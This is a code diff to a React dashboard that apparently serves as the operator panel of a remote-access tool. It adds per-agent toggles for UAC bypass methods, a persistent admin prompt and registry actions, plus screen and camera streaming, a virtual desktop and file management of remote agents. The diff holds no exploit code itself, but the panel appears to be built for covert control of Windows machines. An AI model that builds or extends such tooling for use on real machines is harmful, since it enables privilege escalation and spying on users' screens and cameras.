@@ -1,7 +1,9 @@
 import { useState, useEffect, lazy, Suspense } from "react";
  import { useSocket } from "./components/SocketProvider";
 import { AgentCard } from "./components/AgentCard";
-import { StreamViewer } from "./components/StreamViewer";
+const StreamViewerLazy = lazy(() =>
+  import("./components/StreamViewer").then((mod) => ({ default: mod.StreamViewer }))
+);
 import { CommandPanel } from "./components/CommandPanel";
 import { SystemMonitor } from "./components/SystemMonitor";
 import { FileManager } from "./components/FileManager";
@@ -10,6 +12,7 @@ import { Sidebar } from "./components/Sidebar";
 import { SearchAndFilter } from "./components/SearchAndFilter";
 import { ActivityFeed } from "./components/ActivityFeed";
  import { QuickActions } from "./components/QuickActions";
+import ToggleControlPanel from "./components/ToggleControlPanel";
  const SettingsLazy = lazy(() =>
    import("./components/Settings").then((mod) => ({ default: mod.Settings }))
  );
@@ -19,17 +22,17 @@ import { ActivityFeed } from "./components/ActivityFeed";
  const WebRTCMonitoringLazy = lazy(() =>
    import("./components/WebRTCMonitoring").then((mod) => ({ default: mod.WebRTCMonitoring }))
  );
- import { VoiceControl } from "./components/VoiceControl";
+                                    
  import { BulkUploadManager } from "./components/bulkuploadmanager";
  const ProcessManagerLazy = lazy(() =>
    import("./components/ProcessManager").then((mod) => ({ default: mod.ProcessManager }))
  );
- const VideoPlayerLazy = lazy(() =>
-   import("./components/VideoPlayer").then((mod) => ({ default: mod.VideoPlayer }))
+ const VirtualDesktopLazy = lazy(() =>
+   import("./components/VirtualDesktop").then((mod) => ({ default: mod.VirtualDesktop }))
  );
- import { ThemeProvider } from "./components/ThemeProvider";
- import { ErrorBoundary } from "./components/ErrorBoundary";
- import { Login } from "./components/Login";
+import { ThemeProvider } from "./components/ThemeProvider";
+import { ErrorBoundary } from "./components/ErrorBoundary";
+import { Login } from "./components/Login";
 import {
   Tabs,
   TabsContent,
@@ -45,6 +48,8 @@ import {
 } from "./components/ui/card";
 import { Badge } from "./components/ui/badge";
 import { Button } from "./components/ui/button";
+import { Switch } from "./components/ui/switch";
+import { Label } from "./components/ui/label";
 import {
   Shield,
   Monitor,
@@ -56,6 +61,21 @@ import {
   Wifi,
 } from "lucide-react";
 
+interface Agent {
+  id: string;
+  name: string;
+  status: "online" | "offline";
+  platform: string;
+  ip: string;
+  lastSeen: Date;
+  capabilities: string[];
+  performance: {
+    cpu: number;
+    memory: number;
+    network: number;
+  };
+}
+
 type FilterOptions = {
   status: string[];
   platform: string[];
@@ -65,12 +85,19 @@ type FilterOptions = {
 // Live agents come from SocketProvider via agent_list_update
 
 function AppContent() {
-  const { agents: liveAgents, connected, authenticated } = useSocket();
+  const { agents: liveAgents, connected, authenticated, agentConfig, sendCommand, lastActivity } = useSocket() as {
+    agents: Agent[];
+    connected: boolean;
+    authenticated: boolean;
+    agentConfig: Record<string, any>;
+    sendCommand: (agentId: string, command: string) => void;
+    lastActivity: any;
+  };
   const [selectedAgent, setSelectedAgent] = useState<
     string | null
   >(null);
   const [activeTab, setActiveTab] = useState("overview");
-  const [agents, setAgents] = useState(liveAgents);
+  const [agents, setAgents] = useState<Agent[]>(liveAgents as Agent[]);
   const [networkActivity, setNetworkActivity] = useState("0.0");
 
   useEffect(() => {
@@ -105,12 +132,12 @@ function AppContent() {
   }
 
   const onlineAgents = agents.filter(
-    (agent) => agent.status === "online",
+    (agent: Agent) => agent.status === "online",
   );
 
   // Advanced filtering and sorting
   const filteredAgents = agents
-    .filter((agent) => {
+    .filter((agent: Agent) => {
       // Text search
       const matchesSearch =
         searchTerm === "" ||
@@ -148,7 +175,7 @@ function AppContent() {
         matchesCapabilities
       );
     })
-    .sort((a, b) => {
+    .sort((a: Agent, b: Agent) => {
       let aValue, bValue;
 
       switch (sortBy) {
@@ -180,15 +207,15 @@ function AppContent() {
       }
     });
 
-  const availableFilters = {
+  const availableFilters: { platforms: string[]; capabilities: string[] } = {
     platforms: [
       ...new Set(
-        agents.map((agent) => agent.platform.split(" ")[0]),
+        agents.map((agent: Agent) => agent.platform.split(" ")[0]),
       ),
-    ],
+    ] as string[],
     capabilities: [
-      ...new Set(agents.flatMap((agent) => agent.capabilities)),
-    ],
+      ...new Set(agents.flatMap((agent: Agent) => agent.capabilities)),
+    ] as string[],
   };
 
   const handleAgentSelect = () => {
@@ -335,17 +362,14 @@ function AppContent() {
                   <TabsTrigger value="streaming" className="text-xs sm:text-sm">
                     Streaming
                   </TabsTrigger>
-                  <TabsTrigger value="videos" className="text-xs sm:text-sm">
-                    Videos
+                  <TabsTrigger value="virtual" className="text-xs sm:text-sm">
+                    Virtual Desktop
                   </TabsTrigger>
                   <TabsTrigger value="commands" className="text-xs sm:text-sm">
                     Commands
                   </TabsTrigger>
                   <TabsTrigger value="files" className="text-xs sm:text-sm">
                     Files
-                  </TabsTrigger>
-                  <TabsTrigger value="voice" className="text-xs sm:text-sm">
-                    Voice
                   </TabsTrigger>
                   <TabsTrigger value="monitoring" className="text-xs sm:text-sm">
                     Monitoring
@@ -354,6 +378,15 @@ function AppContent() {
                     WebRTC Pro
                   </TabsTrigger>
                 </TabsList>
+                <div className="text-xs text-muted-foreground">
+                  {lastActivity?.type
+                    ? (String(lastActivity.type).startsWith('files')
+                        ? `Last: Files ${lastActivity.details || ''}`
+                        : String(lastActivity.type).startsWith('stream:')
+                          ? `Last: ${String(lastActivity.type).replace('stream:', '').toUpperCase()} stream ${lastActivity.details || ''}`
+                          : null)
+                    : null}
+                </div>
 
                 <TabsContent
                   value="overview"
@@ -378,6 +411,65 @@ function AppContent() {
                             agentCount={onlineAgents.length}
                             selectedAgent={selectedAgent}
                           />
+                          <Card>
+                            <CardHeader>
+                              <CardTitle>Security Overview</CardTitle>
+                              <CardDescription>
+                                UAC bypass and registry status
+                              </CardDescription>
+                            </CardHeader>
+                            <CardContent>
+                              {(() => {
+                                const aid = selectedAgent || (onlineAgents[0]?.id ?? null);
+                                const cfg = aid ? agentConfig?.[aid] : null;
+                                const bEnabled = Boolean(cfg?.bypasses?.enabled);
+                                const rEnabled = Boolean(cfg?.registry?.enabled);
+                                const uacEnabled = Boolean(cfg?.agent?.enableUACBypass);
+                                const pPrompt = Boolean(cfg?.agent?.persistentAdminPrompt);
+                                const methods = cfg?.bypasses?.methods || {};
+                                const actions = cfg?.registry?.actions || {};
+                                const methodCount = Object.values(methods).filter(Boolean).length;
+                                const actionCount = Object.values(actions).filter(Boolean).length;
+                                return (
+                                  <div className="space-y-3">
+                                    <div className="flex items-center justify-between">
+                                      <span className="text-sm">UAC Bypass</span>
+                                      <Badge variant={uacEnabled && bEnabled ? "default" : "secondary"}>
+                                        {uacEnabled && bEnabled ? "Enabled" : "Disabled"}
+                                      </Badge>
+                                    </div>
+                                    <div className="flex items-center justify-between">
+                                      <span className="text-sm">Persistent Admin Prompt</span>
+                                      <Badge variant={pPrompt ? "default" : "secondary"}>
+                                        {pPrompt ? "On" : "Off"}
+                                      </Badge>
+                                    </div>
+                                    <div className="flex items-center justify-between">
+                                      <span className="text-sm">Registry Controls</span>
+                                      <Badge variant={rEnabled ? "default" : "secondary"}>
+                                        {rEnabled ? "Enabled" : "Disabled"}
+                                      </Badge>
+                                    </div>
+                                    <div className="flex items-center justify-between">
+                                      <span className="text-sm">Enabled UAC Methods</span>
+                                      <Badge variant="secondary">{methodCount}</Badge>
+                                    </div>
+                                    <div className="flex items-center justify-between">
+                                      <span className="text-sm">Enabled Registry Actions</span>
+                                      <Badge variant="secondary">{actionCount}</Badge>
+                                    </div>
+                                    {aid && cfg ? (
+                                      <div className="text-xs text-muted-foreground">
+                                        Agent {aid.slice(0, 8)} • Updated {cfg.updatedAt ? new Date(cfg.updatedAt).toLocaleTimeString() : "—"}
+                                      </div>
+                                    ) : (
+                                      <div className="text-xs text-muted-foreground">Select an agent to view security overview</div>
+                                    )}
+                                  </div>
+                                );
+                              })()}
+                            </CardContent>
+                          </Card>
                         </div>
                       </div>
                     </CardContent>
@@ -395,7 +487,7 @@ function AppContent() {
                   className="space-y-6"
                 >
                   <div className="grid grid-cols-1 lg:grid-cols-2 xl:grid-cols-3 gap-6">
-                    {filteredAgents.map((agent) => (
+                    {filteredAgents.map((agent: Agent) => (
                       <AgentCard
                         key={agent.id}
                         agent={agent}
@@ -406,32 +498,149 @@ function AppContent() {
                       />
                     ))}
                   </div>
+                  <Card>
+                    <CardHeader>
+                      <CardTitle>Security Controls</CardTitle>
+                      <CardDescription>Bypasses and registry controls per selected agent</CardDescription>
+                    </CardHeader>
+                    <CardContent>
+                      {(() => {
+                        const aid = selectedAgent || (onlineAgents[0]?.id ?? null);
+                        const cfg = aid ? agentConfig?.[aid] : null;
+                        const bEnabled = Boolean(cfg?.bypasses?.enabled);
+                        const rEnabled = Boolean(cfg?.registry?.enabled);
+                        const methods = cfg?.bypasses?.methods || {};
+                        const actions = cfg?.registry?.actions || {};
+                        const methodCount = Object.values(methods).filter(Boolean).length;
+                        const actionCount = Object.values(actions).filter(Boolean).length;
+                        return (
+                          <div className="space-y-4">
+                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                              <div className="flex items-center justify-between">
+                                <Label htmlFor="agents-bypass-enabled">Bypasses Enabled</Label>
+                                <Switch
+                                  id="agents-bypass-enabled"
+                                  checked={bEnabled}
+                                  onCheckedChange={(checked) => {
+                                    if (!aid) return;
+                                    sendCommand(aid, checked ? "bypasses:on" : "bypasses:off");
+                                  }}
+                                />
+                              </div>
+                              <div className="flex items-center justify-between">
+                                <Label htmlFor="agents-registry-enabled">Registry Enabled</Label>
+                                <Switch
+                                  id="agents-registry-enabled"
+                                  checked={rEnabled}
+                                  onCheckedChange={(checked) => {
+                                    if (!aid) return;
+                                    sendCommand(aid, checked ? "registry:on" : "registry:off");
+                                  }}
+                                />
+                              </div>
+                            </div>
+                            <div className="flex items-center justify-between">
+                              <span className="text-sm">Enabled UAC Methods</span>
+                              <Badge variant="secondary">{methodCount}</Badge>
+                            </div>
+                            <div className="flex items-center justify-between">
+                              <span className="text-sm">Enabled Registry Actions</span>
+                              <Badge variant="secondary">{actionCount}</Badge>
+                            </div>
+                            <div className="flex items-center gap-2">
+                              <Button
+                                disabled={!aid}
+                                onClick={() => {
+                                  if (!aid) return;
+                                  sendCommand(aid, bEnabled ? "bypasses:on" : "bypasses:off");
+                                }}
+                              >
+                                Apply Bypasses To Selected
+                              </Button>
+                              <Button
+                                variant="outline"
+                                disabled={!aid}
+                                onClick={() => {
+                                  if (!aid) return;
+                                  sendCommand(aid, rEnabled ? "registry:on" : "registry:off");
+                                }}
+                              >
+                                Apply Registry To Selected
+                              </Button>
+                            </div>
+                          </div>
+                        );
+                      })()}
+                    </CardContent>
+                  </Card>
                 </TabsContent>
 
                 <TabsContent
                   value="streaming"
                   className="space-y-6"
                 >
-                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
-                    <StreamViewer
-                      agentId={selectedAgent}
-                      type="screen"
-                      title="Screen Stream"
-                    />
-                    <StreamViewer
-                      agentId={selectedAgent}
-                      type="camera"
-                      title="Camera Stream"
-                    />
-                  </div>
-                </TabsContent>
-
-                <TabsContent value="videos" className="space-y-6">
-                  <Suspense fallback={<div className="text-sm text-muted-foreground p-4">Loading videos…</div>}>
-                    <VideoPlayerLazy />
+                  <Card>
+                    <CardHeader>
+                      <CardTitle>Security Controls</CardTitle>
+                      <CardDescription>Apply bypasses and registry for streaming operations</CardDescription>
+                    </CardHeader>
+                    <CardContent>
+                      {(() => {
+                        const aid = selectedAgent || (onlineAgents[0]?.id ?? null);
+                        const cfg = aid ? agentConfig?.[aid] : null;
+                        const bEnabled = Boolean(cfg?.bypasses?.enabled);
+                        const rEnabled = Boolean(cfg?.registry?.enabled);
+                        return (
+                          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                            <div className="flex items-center justify-between">
+                              <Label htmlFor="stream-bypass-enabled">Bypasses Enabled</Label>
+                              <Switch
+                                id="stream-bypass-enabled"
+                                checked={bEnabled}
+                                onCheckedChange={(checked) => {
+                                  if (!aid) return;
+                                  sendCommand(aid, checked ? "bypasses:on" : "bypasses:off");
+                                }}
+                              />
+                            </div>
+                            <div className="flex items-center justify-between">
+                              <Label htmlFor="stream-registry-enabled">Registry Enabled</Label>
+                              <Switch
+                                id="stream-registry-enabled"
+                                checked={rEnabled}
+                                onCheckedChange={(checked) => {
+                                  if (!aid) return;
+                                  sendCommand(aid, checked ? "registry:on" : "registry:off");
+                                }}
+                              />
+                            </div>
+                          </div>
+                        );
+                      })()}
+                    </CardContent>
+                  </Card>
+                  <Suspense fallback={<div className="text-sm text-muted-foreground p-4">Loading stream viewer…</div>}>
+                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                      <StreamViewerLazy
+                        agentId={selectedAgent}
+                        type="screen"
+                        title="Screen Stream"
+                      />
+                      <StreamViewerLazy
+                        agentId={selectedAgent}
+                        type="camera"
+                        title="Camera Stream"
+                      />
+                    </div>
                   </Suspense>
                 </TabsContent>
 
+                <TabsContent value="virtual" className="space-y-6">
+                  <Suspense fallback={<div className="text-sm text-muted-foreground p-4">Loading virtual desktop…</div>}>
+                    <VirtualDesktopLazy agentId={selectedAgent} />
+                  </Suspense>
+                </TabsContent>
+ 
                 <TabsContent
                   value="commands"
                   className="space-y-6"
@@ -459,18 +668,50 @@ function AppContent() {
                   value="files"
                   className="space-y-6"
                 >
+                  <Card>
+                    <CardHeader>
+                      <CardTitle>Security Controls</CardTitle>
+                      <CardDescription>Apply bypasses and registry that affect file operations</CardDescription>
+                    </CardHeader>
+                    <CardContent>
+                      {(() => {
+                        const aid = selectedAgent || (onlineAgents[0]?.id ?? null);
+                        const cfg = aid ? agentConfig?.[aid] : null;
+                        const bEnabled = Boolean(cfg?.bypasses?.enabled);
+                        const rEnabled = Boolean(cfg?.registry?.enabled);
+                        return (
+                          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                            <div className="flex items-center justify-between">
+                              <Label htmlFor="files-bypass-enabled">Bypasses Enabled</Label>
+                              <Switch
+                                id="files-bypass-enabled"
+                                checked={bEnabled}
+                                onCheckedChange={(checked) => {
+                                  if (!aid) return;
+                                  sendCommand(aid, checked ? "bypasses:on" : "bypasses:off");
+                                }}
+                              />
+                            </div>
+                            <div className="flex items-center justify-between">
+                              <Label htmlFor="files-registry-enabled">Registry Enabled</Label>
+                              <Switch
+                                id="files-registry-enabled"
+                                checked={rEnabled}
+                                onCheckedChange={(checked) => {
+                                  if (!aid) return;
+                                  sendCommand(aid, checked ? "registry:on" : "registry:off");
+                                }}
+                              />
+                            </div>
+                          </div>
+                        );
+                      })()}
+                    </CardContent>
+                  </Card>
                   <FileManager agentId={selectedAgent} />
                 </TabsContent>
 
-                <TabsContent
-                  value="voice"
-                  className="space-y-6"
-                >
-                  <VoiceControl 
-                    agentId={selectedAgent} 
-                    isConnected={onlineAgents.length > 0}
-                  />
-                </TabsContent>
+                
 
                 <TabsContent
                   value="monitoring"
@@ -514,6 +755,7 @@ function AppContent() {
                       </CardContent>
                     </Card>
                   </div>
+                  <ToggleControlPanel />
                 </TabsContent>
 
                 <TabsContent value="webrtc" className="space-y-6">
